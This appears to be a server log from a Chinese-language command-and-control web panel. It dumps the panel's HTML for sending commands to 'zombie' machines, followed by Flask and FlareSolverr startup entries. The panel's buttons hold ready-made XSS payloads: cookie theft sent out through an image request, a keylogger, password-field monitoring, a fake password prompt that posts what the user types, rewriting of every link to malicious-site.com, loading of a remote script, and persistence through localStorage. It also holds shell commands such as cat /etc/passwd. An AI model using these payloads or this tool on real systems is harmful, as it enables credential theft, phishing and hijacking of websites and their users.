-la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'uname -a\')">uname -a</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'df -h\')">df -h</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'cat /etc/passwd\')">查看用戶</button>\n                        <button type="button" class="quick-cmd-btn"></button>\n                    </div>\n                </div>\n                <label class="form-label">XSS載荷</label>\n                <div class="xss-payload">\n                    <!-- 基礎 XSS 載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.cookie || &quot;無Cookie&quot;; })()\')">查看Cookie</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var links = []; document.querySelectorAll(&quot;a&quot;).forEach(function(a){ links.push({text: a.innerText, href: a.href, target: a.target}); }); return JSON.stringify(links, null, 2); })()\')">查看所有連結</button>\n\n                    <!-- 信息收集類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var info = { title: document.title, url: window.location.href, userAgent: navigator.userAgent, referrer: document.referrer, domain: document.domain }; return JSON.stringify(info, null, 2); })()\')">基本信息收集</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var forms = []; document.querySelectorAll(&quot;form&quot;).forEach(function(f, i){ forms.push({ index: i+1, action: f.action, method: f.method, inputs: Array.from(f.querySelectorAll(&quot;input&quot;)).map(inp => ({name: inp.name, type: inp.type, value: inp.value})) }); }); return JSON.stringify(forms, null, 2); })()\')">查看所有表單</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var inputs = []; document.querySelectorAll(&quot;input&quot;).forEach(function(inp){ inputs.push({name: inp.name, type: inp.type, value: inp.value, placeholder: inp.placeholder}); }); return JSON.stringify(inputs, null, 2); })()\')">查看表單輸入值</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return JSON.stringify({ localStorage: Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage[key]; return obj; }, {}), sessionStorage: Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage[key]; return obj; }, {}) }, null, 2); })()\')">查看本地存儲</button>\n\n                    <!-- 鍵盤記錄類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var keys = []; document.addEventListener(\\\'keypress\\\', function(e){ keys.push(e.key); if(keys.length > 50) { alert(\\\'按鍵記錄: \\\' + keys.join(\\\'\\\')); keys = []; } });\')">啟動按鍵記錄</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'input[type=password]\\\').forEach(function(pwd){ pwd.addEventListener(\\\'input\\\', function(){ console.log(\\\'密碼輸入: \\\' + pwd.value); }); });\')">密碼欄位監控</button>\n\n                    <!-- 頁面操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.style.transform = \\\'rotate(180deg)\\\'; setTimeout(function(){ document.body.style.transform = \\\'rotate(0deg)\\\'; }, 3000);\')">翻轉頁面3秒</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.body.innerHTML = \\\'<h1 style=&quot;color:red;text-align:center;margin-top:200px;&quot;>你的網站已被接管！</h1>\\\';\')">替換頁面內容</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'setInterval(function(){ document.body.style.backgroundColor = [\\\'red\\\',\\\'blue\\\',\\\'green\\\',\\\'yellow\\\'][Math.floor(Math.random()*4)]; }, 500);\')">閃爍背景色</button>\n\n                    <!-- 網路請求類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'XSS測試成功 - 來自: \\\' + window.location.href, target_ip: window.location.hostname}) });\')">發送測試消息</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var img = new Image(); img.src = \\\'http://127.0.0.1:8964/api/control/add_message?message=\\\' + encodeURIComponent(\\\'XSS via Image - Cookie: \\\' + document.cookie) + \\\'&target_ip=\\\' + window.location.hostname;\')">通過圖片發送Cookie</button>\n\n                    <!-- 瀏覽器指紋收集 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var fingerprint = { screen: screen.width + &quot;x&quot; + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, language: navigator.language, platform: navigator.platform, plugins: Array.from(navigator.plugins).map(p => p.name), cookieEnabled: navigator.cookieEnabled, onLine: navigator.onLine, hardwareConcurrency: navigator.hardwareConcurrency }; return JSON.stringify(fingerprint, null, 2); })()\')">瀏覽器指紋</button>\n\n                    <!-- 社交工程類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var userInput = prompt(\\\'系統安全檢查：請輸入您的密碼以繼續\\\'); if(userInput) { fetch(\\\'/api/control/add_message\\\', { method: \\\'POST\\\', body: new URLSearchParams({message: \\\'釣魚成功 - 密碼: \\\' + userInput, target_ip: window.location.hostname}) }); }\')">密碼釣魚</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'if(confirm(\\\'檢測到安全威脅！是否要下載安全補丁？\\\')) { alert(\\\'用戶同意下載，可以進行下一步攻擊\\\'); }\')">安全威脅詐騙</button>\n\n                    <!-- 持久性 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'localStorage.setItem(\\\'xss_payload\\\', \\\'setInterval(function(){ console.log(&quot;XSS仍在運行: &quot; + new Date()); }, 30000);\\\'); eval(localStorage.getItem(\\\'xss_payload\\\'));\')">本地存儲持久化</button>\n\n                    <!-- DOM 操作類 XSS -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'var maliciousDiv = document.createElement(\\\'div\\\'); maliciousDiv.innerHTML = \\\'<div style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;color:white;text-align:center;padding-top:200px;&quot;><h2>系統錯誤</h2><p>請聯繫管理員</p></div>\\\'; document.body.appendChild(maliciousDiv);\')">偽造錯誤覆蓋層</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'document.querySelectorAll(\\\'a\\\').forEach(function(link){ if(link.href.includes(\\\'http\\\')) { link.href = \\\'http://malicious-site.com/redirect?original=\\\' + encodeURIComponent(link.href); } });\')">劫持所有外部連結</button>\n\n                    <!-- 高級載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var script = document.createElement(&quot;script&quot;); script.src = &quot;http://127.0.0.1:8964/api/control/xss_payload&quot;; document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T15:07:45.211Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 23:07:45.221365</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-27 15:15:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:04] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-27 15:15:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:04] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-27 15:15:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:04] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-27 15:15:05 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-27 15:15:05 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-27 15:15:05 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-27 15:15:05 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:05] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-27 15:15:07 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-27 15:15:07 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-27 15:15:07 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0016s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-27 15:15:07 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:07] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-27 15:15:15 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-27 15:15:15 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-27 15:15:15 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-27 15:15:15 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:15:15] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-27 15:16:13 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-27 15:16:13 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-27 15:16:13 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0005s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-27 15:16:13 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:16:13] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-27 15:16:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-27 15:16:33 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-27 15:16:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-27 15:16:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [27/Jun/2025 15:16:33] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
2025-06-28 13:28:05 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:05 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:05 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:05 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:05 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:05 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:05 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:05 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:05 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:28:05 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 77155
2025-06-28 13:28:10 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:10 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:10 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:10 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:10 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:10 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:10 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:10 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:10 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:28:10 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 77389
2025-06-28 13:28:16 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:16 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:28:16 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:16 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:28:16 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:16 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:28:16 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:16 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:28:16 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:28:16 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 77541
2025-06-28 13:29:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:29:51 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:29:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:29:51 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:29:51 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:29:51 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:29:51 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:29:51 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:29:51 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:29:51 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 78520
2025-06-28 13:30:21 | ERROR    | start_flaresolverr.py:147 | start_flaresolverr() | FlareSolverr 啟動超時
2025-06-28 13:30:21 | ERROR    | start_flaresolverr.py:161 | start_flaresolverr() | FlareSolverr 啟動超時詳情: 無額外錯誤信息
2025-06-28 13:30:21 | INFO     | start_flaresolverr.py:295 | stop_monitoring() | FlareSolverr 監控已停止
2025-06-28 13:30:21 | INFO     | start_flaresolverr.py:187 | stop_flaresolverr() | 正在停止 FlareSolverr 進程 (PID: 78520)
2025-06-28 13:30:21 | INFO     | start_flaresolverr.py:198 | stop_flaresolverr() | FlareSolverr 已停止
2025-06-28 13:30:21 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-28 13:30:21 | WARNING  | app.py:236 | create_app() | ⚠️ FlareSolverr 服務啟動失敗，但應用將繼續運行
2025-06-28 13:30:21 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-28 13:30:21 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-28 13:36:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:36:23 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:36:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:36:23 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:36:23 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:36:23 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:36:23 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:36:23 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:36:23 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:36:23 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 80610
2025-06-28 13:36:27 | INFO     | start_flaresolverr.py:127 | start_flaresolverr() | FlareSolverr 啟動成功，運行在 http://localhost:8191
2025-06-28 13:36:27 | INFO     | start_flaresolverr.py:288 | start_monitoring() | FlareSolverr 監控已啟動
2025-06-28 13:36:27 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 13:36:27 | INFO     | app.py:234 | create_app() | ✅ FlareSolverr 服務已啟動
2025-06-28 13:36:27 | INFO     | _internal.py:97 | _log() | [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:8964
2025-06-28 13:36:27 | INFO     | _internal.py:97 | _log() | [33mPress CTRL+C to quit[0m
2025-06-28 13:36:42 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:36:42 | INFO     | config.py:217 | setup_enhanced_logging() | 🚀 增強日誌系統已啟動
2025-06-28 13:36:42 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:36:42 | DEBUG    | config.py:218 | setup_enhanced_logging() | 調試級別日誌已啟用
2025-06-28 13:36:42 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:36:42 | INFO     | app.py:217 | create_app() | 正在檢查 FlareSolverr 服務...
2025-06-28 13:36:42 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:36:42 | INFO     | app.py:231 | create_app() | 正在啟動 FlareSolverr 服務...
2025-06-28 13:36:42 | INFO     | start_flaresolverr.py:91 | start_flaresolverr() | 正在啟動 FlareSolverr: /home/hacker/Desktop/share/C2/tools/FlareSolverr/src/flaresolverr.py
2025-06-28 13:36:42 | INFO     | start_flaresolverr.py:117 | start_flaresolverr() | FlareSolverr 進程已啟動，PID: 80978
